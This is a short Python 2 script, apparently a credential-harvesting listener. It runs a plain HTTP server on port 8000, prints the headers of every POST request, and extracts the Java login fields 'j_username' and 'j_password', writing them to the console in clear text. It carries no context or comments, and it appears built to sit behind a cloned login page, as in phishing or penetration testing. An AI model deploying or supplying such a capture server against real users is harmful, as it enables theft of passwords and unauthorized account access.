#!/usr/bin/python

import SimpleHTTPServer
import SocketServer
import cgi

PORT=8000

class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    def do_POST(self):
        print("########################### HEADERS")
        print(self.headers)

        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST'})

        print("########################### PAYLOAD")
        for key in ("j_username", "j_password"):
            value = form.getlist(key)
            print("%s: %s" % (key, value))
        print("\n")

        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

Handler = ServerHandler
httpd = SocketServer.TCPServer(("", PORT), Handler)

print("### STARTING SERVER @ %d ###\n\n" % PORT)
httpd.serve_forever()
